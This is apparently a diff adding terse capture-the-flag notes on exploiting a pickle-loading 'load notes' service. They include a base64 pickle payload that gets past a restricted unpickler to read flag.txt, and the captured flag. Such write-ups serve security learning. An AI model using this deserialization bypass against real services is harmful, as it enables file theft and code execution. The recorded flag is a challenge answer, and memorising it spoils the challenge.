@@ -1,0 +1,15 @@
+Target
+	RCE in load notes
+
+
+python3 test1.py
+	_pickle.UnpicklingError: Your pickle is trying to load something sneaky. Only the modules __main__, __builtin__ and copyreg are allowed. eval and exec are not allowed. 'posix.system' is forbidden
+
+Make a pickle sequence
+
+python3 exp.py
+	Y19fYnVpbHRpbl9fCnByaW50CnAwCihjX19idWlsdGluX18KZ2V0YXR0cgpwMQooY19fYnVpbHRpbl9fCm9wZW4KcDIKKFYuL2ZsYWcudHh0CnAzCnRwNApScDUKVnJlYWRsaW5lcwpwNgp0cDcKUnA4Cih0UnA5CnRwMTAKUnAxMQou
+
+
+nc, load notes, paste payload
+	midnight{d311c10u5_p1ck135_f0r_3v3ry0n3}
